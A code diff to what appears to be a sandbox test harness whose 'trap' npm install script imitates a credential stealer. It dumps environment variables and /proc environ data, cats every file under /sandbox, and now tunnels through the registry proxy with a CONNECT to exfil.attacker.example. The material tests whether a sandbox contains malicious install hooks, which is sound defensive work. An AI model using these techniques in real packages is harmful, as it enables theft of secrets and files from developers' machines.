@@ -45,7 +45,7 @@ https.createServer({ key: fs.readFileSync("/tmp/k.pem"), cert: fs.readFileSync("
 
 /** The install script of the `trap` package: everything a credential stealer would try, reported to /sandbox/trap-report.json. */
 export const TRAP_JS = String.raw`
-const fs = require("fs"), net = require("net"), dns = require("dns"), cp = require("child_process");
+const fs = require("fs"), net = require("net"), dns = require("dns"), cp = require("child_process"), http = require("http");
 const tcp = (host, port) => new Promise((res) => {
   const s = net.connect({ host, port });
   const done = (v) => { try { s.destroy(); } catch (e) {} res(v); };
@@ -54,8 +54,24 @@ const tcp = (host, port) => new Promise((res) => {
   s.on("error", (e) => done(e.code || "error"));
 });
 const sh = (c) => { try { return cp.execSync(c, { encoding: "utf8", timeout: 8000, stdio: ["ignore", "pipe", "ignore"] }); } catch (e) { return "ERR " + (e.stdout || ""); } };
+// What a stealer that found the proxy address in the sandbox's own .npmrc would try through it.
+const viaProxy = () => new Promise((resolve) => {
+  let url;
+  try { url = new URL(/^registry=(.*)$/m.exec(fs.readFileSync("/sandbox/project/.npmrc", "utf8"))[1].trim()); } catch (e) { return resolve({ error: "no proxy url" }); }
+  const out = {};
+  const connect = http.request({ host: url.hostname, port: url.port, method: "CONNECT", path: "exfil.attacker.example:443", timeout: 4000 });
+  connect.on("connect", (res) => { out.connect = res.statusCode; res.socket.destroy(); step(); });
+  connect.on("error", (e) => { out.connect = e.code; step(); });
+  connect.on("timeout", () => connect.destroy());
+  connect.end();
+  function step() {
+    const get = http.get({ host: url.hostname, port: url.port, path: "/some-other-private-package", timeout: 4000 }, (res) => { out.otherPackage = res.statusCode; res.resume(); res.on("end", () => resolve(out)); });
+    get.on("error", (e) => { out.otherPackage = e.code; resolve(out); });
+  }
+});
 (async () => {
   const report = {
+    viaProxy: await viaProxy(),
     env: process.env,
     proc: sh("cat /proc/[0-9]*/environ /proc/[0-9]*/cmdline | tr '\\0' '\\n'"),
     files: sh("find /sandbox -type f -not -path '*/node_modules/*' -not -name trap-report.json -size -2000k -exec cat {} +"),
